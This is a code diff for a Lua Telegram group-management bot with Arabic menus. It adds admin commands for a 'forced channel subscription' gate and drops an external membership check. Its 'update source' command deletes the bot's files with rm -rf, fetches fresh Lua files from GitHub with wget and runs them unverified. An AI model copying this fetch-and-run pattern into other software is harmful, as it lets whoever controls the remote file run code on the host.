+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Text = [[
 🥇┇ اوامر المدراء
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -6150,12 +7508,21 @@ Text = [[
 تغير رد المميز + النص
 تغير رد العضو + النص
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH [@Source_Milano] 
+[Ch Source](t.me/Source_Milano)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
 end
-if text == 'م4' and Constructor(msg) then
+if text == 'م4' and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 Text = [[
 🏅┇اوامر المنشئين الاساسين 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -6175,7 +7542,7 @@ Text = [[
 ➕┇اضف رسائل + العدد بالرد
 ➕┇اضف مجوهرات + العدد بالرد
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH [@Source_Milano] 
+[Ch Source](t.me/Source_Milano)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -6221,7 +7588,7 @@ Text = [[
 ➕┇اذاعه بالتثبيت 
 ➕┇الاحصائيات 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇CH [@Source_Milano] 
+[Ch Source](t.me/Source_Milano)
 ]]
 send(msg.chat_id_, msg.id_,Text)
 return false
@@ -6231,12 +7598,6 @@ end ---- Chat_Type = 'GroupBot'
 end ---- Chat_Type = 'GroupBot' 
 
 if text == 'تفعيل' and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
-end
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,'🚸┇البوت ليس ادمن يرجى ترقيتي !') 
 return false  
@@ -6249,7 +7610,7 @@ end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
 if database:sismember(bot_id..'LARViN:Chek:Groups',msg.chat_id_) then
-send(msg.chat_id_, msg.id_,'☑┇المجموعه مفعله سابقا ')
+send(msg.chat_id_, msg.id_,'📮┇المجموعه مفعله سابقا ')
 else
 Reply_Status(msg,result.id_,'reply_Add','☑┇تم تفعيل المجموعه ~ '..chat.title_..'')
 database:sadd(bot_id..'LARViN:Chek:Groups',msg.chat_id_)
@@ -6283,12 +7644,15 @@ end,nil)
 end,nil) 
 end,nil)
 end
-if text == 'تعطيل' and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == 'تعطيل' and DevBot(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
@@ -6313,8 +7677,6 @@ LinkGp = linkgpp.result
 else
 LinkGp = 'لا يوجد'
 end
-database:set(bot_id.."LARViN:Private:Group:Link"..msg.chat_id_,LinkGp) 
-
 Text = '🔖┇تم تعطيل مجموعه جديده\n'..
 '\n🔘┇بواسطة ~ '..Name..''..
 '\n🔧┇ايدي المجموعه ~ `'..IdChat..'`'..
@@ -6327,12 +7689,15 @@ end
 end,nil) 
 end,nil) 
 end
-if text == 'تفعيل' and not DevBot(msg) and not database:get(bot_id..'LARViN:Free:Add:Bots') then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == 'تفعيل' and not DevBot(msg) and not database:get(bot_id..'LARViN:Free:Add:Bots') then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,'🚸┇البوت ليس ادمن يرجى ترقيتي !') 
@@ -6399,6 +7764,15 @@ end
 
 if Chat_Type == 'UserBot' then
 if text == '/start' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end  
 if DevLARViN(msg) then
 local Text = '📥┇مرحبا بك في اوامر المطور الجاهزه'
 local keyboard = {
@@ -6411,6 +7785,11 @@ local keyboard = {
 {'تفعيل الاذاعه 🔔','تعطيل الاذاعه 🔕'},
 {'مسح قائمه العام 📮','مسح المطورين 🚸'},
 {'حذف كليشه ستارت 🃏','ضع كليشه ستارت 📧'},
+{'- تعطيل الاشتراك الاجباري 📄 .'},
+{'- تغير الاشتراك 🧾 .','حذف رساله الاشتراك ℹ .'},
+{'- تفعيل الاشتراك الاجباري 📄 .'},
+{'- الاشتراك الاجباري 📮 .'},
+{'- تعين قناة الاشتراك 📁 .','- تغير رساله الاشتراك 🧾 .'},
 {'تحديث السورس 📥','تحديث ♻'},
 {'قائمه العام 🚷'},
 {'جلب نسخه احتياطيه 📁'},
@@ -6655,6 +8034,93 @@ if text == 'حذف كليشه ستارت 🃏' then
 database:del(bot_id..'Start:Bot') 
 send(msg.chat_id_, msg.id_,'🔘┇تم حذف كليشه ستارت') 
 end
+if text and text:match("^- تغير الاشتراك 🧾 .$") and DevLARViN(msg) then  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_, '🔘┇حسنآ ارسل لي معرف القناة')
+return false  
+end
+if text and text:match("^- تغير رساله الاشتراك 🧾 .$") and DevLARViN(msg) then  
+database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_, '🔘┇حسنآ ارسل لي النص الذي تريده')
+return false  
+end
+if text == "حذف رساله الاشتراك ℹ ." and DevLARViN(msg) then  
+database:del(bot_id..'text:ch:user')
+send(msg.chat_id_, msg.id_, "🔘┇تم مسح رساله الاشتراك ")
+return false  
+end
+if text and text:match("^- تعين قناة الاشتراك 📁 .$") and DevLARViN(msg) then  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_, '🔘┇حسنآ ارسل لي معرف القناة')
+return false  
+end
+if text == "- تفعيل الاشتراك الاجباري 📄 ." and DevLARViN(msg) then  
+if database:get(bot_id..'add:ch:id') then
+local addchusername = database:get(bot_id..'add:ch:username')
+send(msg.chat_id_, msg.id_,"🔘┇الاشتراك الاجباري مفعل \n🔘┇على القناة » ["..addchusername.."]")
+else
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
+send(msg.chat_id_, msg.id_,"🔘┇اهلا عزيزي المطور \n🔘┇ارسل الان معرف قناتك")
+end
+return false  
+end
+if text == "- تعطيل الاشتراك الاجباري 📄 ." and DevLARViN(msg) then  
+database:del(bot_id..'add:ch:id')
+database:del(bot_id..'add:ch:username')
+send(msg.chat_id_, msg.id_, "🔘┇تم تعطيل الاشتراك الاجباري ")
+return false  
+end
+if text == "- الاشتراك الاجباري 📮 ." and DevLARViN(msg) then  
+if database:get(bot_id..'add:ch:username') then
+local addchusername = database:get(bot_id..'add:ch:username')
+send(msg.chat_id_, msg.id_, "🔘┇تم تفعيل الاشتراك الاجباري \n🔘┇على القناة » ["..addchusername.."]")
+else
+send(msg.chat_id_, msg.id_, "🔘┇لا يوجد قناة في الاشتراك الاجباري ")
+end
+return false  
+end
+if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
+if text and text:match("^الغاء$") then 
+send(msg.chat_id_, msg.id_, "🔘┇تم الغاء الامر ")
+database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+return false  end 
+database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+local username = string.match(text, "@[%a%d_]+") 
+tdcli_function ({    
+ID = "SearchPublicChat",    
+username_ = username  
+},function(arg,data) 
+if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
+send(msg.chat_id_, msg.id_, '🔘┇المعرف لا يوجد فيه قناة')
+return false  end
+if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
+send(msg.chat_id_, msg.id_, '🔘┇عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
+return false  end
+if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
+send(msg.chat_id_, msg.id_,'🔘┇عذا لا يمكنك وضع معرف مجموعه بالاشتراك ')
+return false  end
+if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
+if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
+send(msg.chat_id_, msg.id_,'🔘┇البوت ادمن في القناة \n🔘┇تم تفعيل الاشتراك الاجباري في \n🔘┇ايدي القناة ('..data.id_..')\n🔘┇معرف القناة ([@'..data.type_.channel_.username_..'])')
+database:set(bot_id..'add:ch:id',data.id_)
+database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
+else
+send(msg.chat_id_, msg.id_,'🔘┇عذرآ البوت ليس ادمن بالقناه ')
+end
+return false  
+end
+end,nil)
+end
+if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
+if text and text:match("^الغاء$") then 
+send(msg.chat_id_, msg.id_, "🔘┇تم الغاء الامر ")
+database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+return false  end 
+database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+local texxt = string.match(text, "(.*)") 
+database:set(bot_id..'text:ch:user',texxt)
+send(msg.chat_id_, msg.id_,'🔘┇تم تغيير رسالة الاشتراك ')
+end
 if text == ("مسح قائمه العام 📮") and DevLARViN(msg) then
 database:del(bot_id.."LARViN:GBan:User")
 send(msg.chat_id_, msg.id_, "\n📮┇تم مسح قائمه العام")
@@ -6768,8 +8234,8 @@ if text == "تحديث السورس 📥" then
 send(msg.chat_id_,msg.id_,'☑┇تم التحديث')
 os.execute('rm -rf LARViN.lua')
 os.execute('rm -rf start.lua')
-download_to_file('https://raw.githubusercontent.com/LARViNTeam/LARViN/master/LARViN.lua', 'LARViN.lua') 
-download_to_file('https://raw.githubusercontent.com/LARViNTeam/LARViN/master/start.lua', 'start.lua') 
+os.execute('wget https://raw.githubusercontent.com/LARViNTeam/LARViN/master/LARViN.lua')
+os.execute('wget https://raw.githubusercontent.com/LARViNTeam/LARViN/master/start.lua')
 dofile('LARViN.lua')  
 return false
 end
@@ -6903,7 +8369,7 @@ if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-local Name_Bot = (database:get(bot_id.."LARViN:Name:Bot") or "تشاكي")
+local Name_Bot = (database:get(bot_id.."LARViN:Name:Bot") or "لارفين")
 if not database:get(bot_id.."LARViN:Fun_Bots"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
